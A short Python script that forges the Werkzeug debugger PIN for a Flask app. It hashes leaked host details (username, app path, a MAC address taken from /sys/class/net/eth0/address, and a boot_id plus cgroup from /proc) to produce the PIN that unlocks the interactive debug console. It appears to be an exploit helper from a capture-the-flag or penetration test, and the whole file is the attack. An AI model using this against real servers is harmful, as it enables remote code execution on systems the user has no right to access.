import hashlib
from itertools import chain

probably_public_bits = [
    "root", # /etc/shadow
    "flask.app", #with Django: django.contrib.staticfiles.handlers	
    "Flask", # with Django: StaticFilesHandler
    "/usr/local/lib/python3.11/site-packages/flask/app.py", # with Django: /path/to/handlers.py, maybe: /usr/local/lib/python3.11/site-packages/django/contrib/staticfiles/handlers.py
]

private_bits = [
    "230991106970274",  # MAC -> int /sys/class/net/eth0/address
    "634ea957-41ed-43dc-aafb-a6b76a973711cri-containerd-b50c9d3f0cc6b8a851ec611812fa5a697ff85578a4db80bcc1f02184b6230bed.scope"
        # /proc/sys/kernel/random/boot_id + /proc/self/cgroup
]

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode("utf-8")
    h.update(bit)
h.update(b"cookiesalt")

cookie_name = f"__wzd{h.hexdigest()[:20]}"

rv = None
num = None

if num is None:
    h.update(b"pinsalt")
    num = f"{int(h.hexdigest(), 16):09d}"[:9]

if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = "-".join(
                num[x: x + group_size].rjust(group_size, "0")
                for x in range(0, len(num), group_size)
            )
            break
    else:
        rv = num

print(rv)
